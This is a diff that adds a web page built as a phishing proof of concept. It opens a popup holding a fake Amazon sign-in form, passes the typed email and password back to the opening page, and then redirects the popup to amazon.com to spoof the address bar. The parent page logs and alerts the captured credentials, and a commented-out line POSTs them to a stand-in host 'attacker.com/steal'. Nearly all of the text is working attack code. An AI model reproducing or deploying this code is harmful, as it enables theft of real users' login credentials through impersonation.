@@ -1,0 +1,74 @@
+<script>
+let spoofWindow;
+
+function initiateSpoof() {
+    // Open with javascript: URL to maintain same-origin control initially
+    spoofWindow = window.open('javascript:void(0)', 'spoof', 'width=600,height=400');
+    
+    // Write our phishing content immediately
+    spoofWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Amazon Sign-In</title>
+            <style>
+                body { font-family: Arial, sans-serif; padding: 20px; }
+                .login-form { max-width: 300px; margin: 0 auto; }
+                input { width: 100%; padding: 10px; margin: 5px 0; }
+                button { width: 100%; padding: 10px; background: #FF9900; border: none; }
+            </style>
+        </head>
+        <body>
+            <div class="login-form">
+                <h2>Amazon Sign-In</h2>
+                <form id="loginForm">
+                    <input type="email" id="email" placeholder="Email or mobile number">
+                    <input type="password" id="password" placeholder="Password">
+                    <button type="submit">Sign in</button>
+                </form>
+            </div>
+            <script>
+                document.getElementById('loginForm').onsubmit = function(e) {
+                    e.preventDefault();
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    
+                    // Send credentials back to parent before redirect
+                    window.opener.postMessage({
+                        type: 'credentials',
+                        email: email,
+                        password: password
+                    }, '*');
+                    
+                    // Then redirect to actual Amazon to make it look legitimate
+                    window.location.href = 'https://amazon.com';
+                };
+            <\/script>
+        </body>
+        </html>
+    `);
+    
+    // Now rapidly redirect to trigger address bar spoof
+    setTimeout(() => {
+        try {
+            spoofWindow.location.href = 'https://amazon.com';
+        } catch(e) {
+            // Handle cross-origin errors
+        }
+    }, 100);
+}
+
+// Listen for credentials from popup
+window.addEventListener('message', function(event) {
+    if (event.data.type === 'credentials') {
+        // Capture the stolen credentials
+        console.log('Captured credentials:', event.data);
+        alert('Credentials captured: ' + event.data.email + ' / ' + event.data.password);
+        
+        // In real attack, send to attacker server
+        // fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify(event.data)});
+    }
+});
+</script>
+
+<a href="#" onclick="initiateSpoof()">Login with Amazon</a>
